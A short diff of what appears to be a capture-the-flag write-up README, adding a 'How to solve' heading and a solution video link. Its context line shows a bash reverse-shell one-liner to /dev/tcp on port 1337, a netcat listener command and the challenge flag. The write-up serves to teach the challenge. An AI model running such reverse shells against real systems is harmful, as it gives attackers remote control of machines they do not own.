@@ -67,4 +67,9 @@ bash -i >& /dev/tcp/web3/1337 0>&1 then after saving the file: nc -lvnp 1337
 flag{PATRIOT_PASS} 
 </details>
 
-![image](https://github.com/user-attachments/assets/3d1260d3-cf7c-4ffc-a3d2-5f73fcc32ac4)
+## How to solve
+This video has audio and is in 1.5x speed
+
+https://github.com/user-attachments/assets/14aa9844-b534-4b56-a318-14a6dd87ef13
+
+
